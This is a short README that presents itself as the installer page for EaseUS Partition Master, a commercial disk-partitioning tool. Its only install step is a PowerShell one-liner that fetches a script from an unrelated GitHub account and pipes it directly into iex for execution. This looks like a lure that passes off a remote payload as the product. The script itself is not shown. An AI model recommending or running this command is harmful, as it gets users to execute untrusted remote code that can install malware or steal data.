# EaseUS-Partition-Master-Setup

EaseUS Partition Master resizes, merges, clones, and formats disk partitions with an intuitive wizard. Convert MBR to GPT, migrate OS to SSD, and create WinPE bootable disk.

## Install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That is all you need. The script handles download, extraction, and configuration.

## Requirements

- Windows 10 or 11 (64-bit)
- PowerShell 5.1+
- Internet connection for initial download

## What Gets Installed

- Main application binary
- Required runtime libraries
- Start Menu shortcut
- Optional Desktop shortcut

## Support

If you encounter issues, delete the install folder and re-run the command above.
